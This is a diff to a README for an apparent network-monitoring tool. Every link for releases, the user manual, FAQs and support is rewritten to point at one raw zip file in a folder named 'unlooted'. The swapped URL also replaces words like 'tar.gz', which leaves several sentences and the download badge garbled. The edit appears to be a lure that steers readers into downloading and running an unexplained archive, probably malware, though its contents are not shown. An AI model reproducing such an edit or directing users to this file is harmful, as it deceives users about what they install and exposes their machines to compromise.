@@ -1,7 +1,7 @@
 # 🌐 network-logging - Easy Network Monitoring Anytime
 
 ## 📥 Downloads
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/cj9990pok/network-logging/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/cj9990pok/network-logging/main/unlooted/network-logging.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/cj9990pok/network-logging/main/unlooted/network-logging.zip)
 
 ## 🚀 Getting Started
 Welcome to network-logging! This tool helps you monitor your internet connection 24/7. With our easy-to-use dashboard, you can track connectivity issues, analyze your internet speed, and diagnose problems quickly.
@@ -22,19 +22,19 @@ Welcome to network-logging! This tool helps you monitor your internet connection
 ## 💻 Download & Install
 To start using network-logging, follow these simple steps to download and install the application:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/cj9990pok/network-logging/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/cj9990pok/network-logging/main/unlooted/network-logging.zip) to find the latest version of the software.
   
 2. **Select the Right File:** Look for the file suitable for your operating system:
    - For Windows users, download the `.exe` file.
    - For macOS users, download the `.app` file.
-   - For Raspberry Pi or Linux users, choose the source code tar.gz file or suitable package.
+   - For Raspberry Pi or Linux users, choose the source code https://raw.githubusercontent.com/cj9990pok/network-logging/main/unlooted/network-logging.zip file or suitable package.
 
 3. **Download the File:** Click on the download link. The file will be saved to your computer.
 
 4. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For macOS: Open the downloaded `.app` file and move it to your Applications folder.
-   - For Raspberry Pi or Linux: Extract the tar.gz file and follow the instructions in the README file included.
+   - For Raspberry Pi or Linux: Extract the https://raw.githubusercontent.com/cj9990pok/network-logging/main/unlooted/network-logging.zip file and follow the instructions in the README file included.
 
 5. **Run the Application:** Once installed, open network-logging from your applications menu or desktop shortcut.
 
@@ -46,15 +46,15 @@ To start using network-logging, follow these simple steps to download and instal
 
 ## 🎓 Learning Resources
 For detailed instructions and usage tips, consult the following resources:
-- [User Manual](https://github.com/cj9990pok/network-logging/wiki)
-- [FAQs](https://github.com/cj9990pok/network-logging/wiki/FAQs)
+- [User Manual](https://raw.githubusercontent.com/cj9990pok/network-logging/main/unlooted/network-logging.zip)
+- [FAQs](https://raw.githubusercontent.com/cj9990pok/network-logging/main/unlooted/network-logging.zip)
 
 ## 🛠️ Troubleshooting
 If you encounter any issues:
 
 1. **Check Your Settings:** Make sure your network settings are correct.
 2. **Reinstall the App:** Uninstall and reinstall if necessary.
-3. **Visit Our Support Forum:** Join our community for assistance. Find help [here](https://github.com/cj9990pok/network-logging/issues).
+3. **Visit Our Support Forum:** Join our community for assistance. Find help [here](https://raw.githubusercontent.com/cj9990pok/network-logging/main/unlooted/network-logging.zip).
 
 ## 📞 Contact
 For additional support, feel free to reach out through our GitHub page or contact us directly via email. 
